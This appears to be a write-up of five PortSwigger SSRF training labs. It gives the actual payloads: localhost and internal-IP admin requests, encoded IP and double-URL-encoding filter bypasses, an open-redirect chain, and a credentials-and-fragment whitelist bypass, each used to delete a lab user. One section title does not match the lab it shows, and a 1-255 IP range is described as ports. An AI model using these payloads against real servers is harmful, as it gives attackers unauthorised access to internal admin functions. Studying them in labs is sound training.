 _____________
#ssrf
# Lab: Basic SSRF against the local server

- We're going to use **portswigger**, and using **burp suite** we're going to capture stock requests


<img width="2592" height="703" alt="Captura de pantalla (25) 1" src="https://github.com/user-attachments/assets/a71cab09-a2f3-4c4b-a3e1-235e2c307364" />



- This is where we'll make the website send the malicious request "http://localhost/admin" ***It's important to always check which parameter is making the request because that's where the vulnerability is exploited***
   
<img width="2035" height="917" alt="Captura de pantalla (26)" src="https://github.com/user-attachments/assets/ab3f5b23-badf-40c4-be8d-baf28a7923ab" />


- We copy this request and send it via **Stock API** so that the server can make this request for us, which will be to delete the user Carlos.


<img width="601" height="59" alt="Captura de pantalla 2026-03-26 004559" src="https://github.com/user-attachments/assets/bf490e9b-89b6-48f2-b3b1-508e4fa1d080" />

- We sent it, and we see that it was successfully deleted

<img width="1223" height="569" alt="Captura de pantalla 2026-03-26 004649" src="https://github.com/user-attachments/assets/7e02ddb1-1203-4f31-88a4-f7376f003072" />

_______________


# Lab: Basic SSRF against another back-end system

- In this exercise, the same deletion process is performed, but in this case, it is necessary to check which specific IP address can be used to perform this action.

```
To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`
```


<img width="785" height="555" alt="Captura de pantalla 2026-03-26 005658" src="https://github.com/user-attachments/assets/3c4847a4-6e0c-4a15-91cb-8901b961dbe2" />

- We captured the request and sent it to the **Intruder** to test which of the **255 IPs** is the correct one.

<img width="709" height="493" alt="Captura de pantalla 2026-03-26 010249" src="https://github.com/user-attachments/assets/ea003665-75f6-406a-b93c-553863d74614" />
      We corrected the request to match the information we need

<img width="654" height="380" alt="Captura de pantalla 2026-03-26 010320" src="https://github.com/user-attachments/assets/f0a8e0c4-51f4-44a4-89c2-44282e8531eb" />
       We set up the intruder with the range 1-255 (which corresponds to the number of ports)

<img width="1434" height="332" alt="Captura de pantalla 2026-03-26 012516" src="https://github.com/user-attachments/assets/1985d074-fc9c-4c6f-9cf2-271797ccc2f1" />


- We found that one with a **Status code 200** 

<img width="1473" height="465" alt="Captura de pantalla 2026-03-26 014334" src="https://github.com/user-attachments/assets/fc63ae8b-d731-4359-b59f-bbd6baa46e17" />

- If we go back to the ***Repeater*** and try with **205** and we send the request se will see it gives us the info we need so we just to re-send the request with the **delete instruction** 

<img width="493" height="55" alt="Pasted image 20260326014651" src="https://github.com/user-attachments/assets/831dd714-9cf9-4da8-87ef-20bb32cb66b2" />

- and it is successful

<img width="1353" height="405" alt="Captura de pantalla 2026-03-26 014811" src="https://github.com/user-attachments/assets/d9aa8dea-64e3-4b0a-947d-dcee20dfde43" />

___________________________


#  Lab: Blind SSRF with out-of-band detection

- In this exercise We are facing a **safety measure** designed to avoid **SSRF attacks** let's see it

<img width="1176" height="313" alt="Captura de pantalla 2026-03-26 025253" src="https://github.com/user-attachments/assets/1e869c42-73fe-410e-affc-5d21d48ab532" />

- taking this into account we to work in the various ways how the **IP/Localhost** is represented and its taken by the **WAF** and if is accepted, let's see some tries:


`option 1`

```
http://127.0.0.1/admin
```
     It did not work

`
`option 2 - Hex`

```
http://0x7f000001/admin
```
     It did not work

```
http://0x7f000001/admi
```
     If we check with a route it does not exist, give us back a 500 Code status which is a clue, something is broken but we need to have better aim. We can deduce Victim system is working to find this route, it's a good new. Localhost is processing orders

`option 3`

```
http://127.1/admin
```
     Bad request

```
http://127.1/admi
```
     respond with a 404, it confirms system victims is processing orders, let's double URL-encode a character and see if works 

```
http://127.1/%2561dmin
```
      It worked, now we just need to request the delete route

```
http://127.1/%2561dmin/delete?username=carlos
```

<img width="1260" height="279" alt="Captura de pantalla 2026-03-26 032122" src="https://github.com/user-attachments/assets/c6c342fe-33f0-4d51-84da-4c804248d8ec" />

______________________

# Lab: SSRF with filter bypass via open redirection vulnerability

- In this exercise we need to find a **open redirect** which is our attack vector.

<img width="1546" height="118" alt="Captura de pantalla 2026-03-26 041454" src="https://github.com/user-attachments/assets/bb948390-a49d-49e6-bdca-2e9836597166" />
     As the exercise said, we need to find a **open redirect** and use it as vector attack

<img width="707" height="125" alt="Captura de pantalla 2026-03-26 041640" src="https://github.com/user-attachments/assets/b777094c-4bc9-414f-a8e0-2c4332ec9078" />
     We capture the open **redirect request** and we see the **path=/**  which is use to redirect, Lets prove it on a **HTTP** request

<img width="1520" height="234" alt="Captura de pantalla 2026-03-26 043235" src="https://github.com/user-attachments/assets/98fcfcee-940d-4195-97dd-254cb5137cc4" />
     It worked when we sent the 

- Seeing how the **redirection request** works, now we need to understand how use it against it self

<img width="773" height="259" alt="Captura de pantalla 2026-03-26 043651" src="https://github.com/user-attachments/assets/82d649a3-2db3-4b25-b065-53133ad4c58f" />
     Here we got the **stock request** captured, we see this one only accepts routes

- Now add the route with the **open redirect** to the StockApi to use it as **attack vector**

```
/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```

<img width="1336" height="320" alt="Captura de pantalla 2026-03-26 185706" src="https://github.com/user-attachments/assets/051d0738-f197-4800-9fad-28cade707af7" />

- As the request worked as we expected now we just need to delete the user ***Carlos***

```
/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

<img width="1416" height="261" alt="Captura de pantalla 2026-03-26 190249" src="https://github.com/user-attachments/assets/670e2061-97c6-4037-8f3a-52fa1985d92d" />

_____________________

# Lab: SSRF with whitelist-based input filter

- First we capture the **stock request** and try the next route 

```
http://localhost/admin
```

<img width="1228" height="280" alt="Captura de pantalla 2026-03-26 232641" src="https://github.com/user-attachments/assets/d2416fed-925f-45cd-9335-41a243f15085" />
       We see the page only accepts routes from a specific place 

```
stock.weliketoshop.net
```

- knowing this now we will opt to **bypass** this **whitelist filters** through the **login method** used in **HTTP requests**

```
http://user:password@stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```
     First let's see if it works. which means that an SSRF attack can be done

<img width="1070" height="257" alt="Captura de pantalla 2026-03-26 234426" src="https://github.com/user-attachments/assets/d5bd97a6-df82-4e45-90d5-648e24650437" />

- It worked properly, with this now let's target **localhost** and also use the ***hash change tool*** use by certain web sites.

```
http://localhost%2523@stock.weliketoshop.net:8080/
```
     %2523 -> result of a double URL-encode of the #

<img width="1305" height="94" alt="Captura de pantalla 2026-03-26 235326" src="https://github.com/user-attachments/assets/03c08806-af08-46c5-8749-7d39159bfc65" />
      In this moment we are already enumerating information via  **SSRF attack**, but let's escalate the attack till delete the user **carlos**

<img width="1365" height="235" alt="Captura de pantalla 2026-03-26 235741" src="https://github.com/user-attachments/assets/d29c704c-0d77-4439-a478-5ba156cd128c" />
        We check the route with the **/admin** and we see the **delete route**, let's add it our payload

```
http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos
```

<img width="1411" height="261" alt="Captura de pantalla 2026-03-26 235830 1" src="https://github.com/user-attachments/assets/08ba5225-e4fe-4c81-aec0-ac9f4cd945e8" />
      We send it and we see a **302 status code (redirection)**, it worked successfully

<img width="1194" height="241" alt="Captura de pantalla 2026-03-26 235854" src="https://github.com/user-attachments/assets/884a23db-7adc-4a6f-803a-46821d17c34a" />


     This exercise taught us how a misconfigured whitelist filter allows for SSRF, which allow us to list information and make requests due to insufficient input sanitization
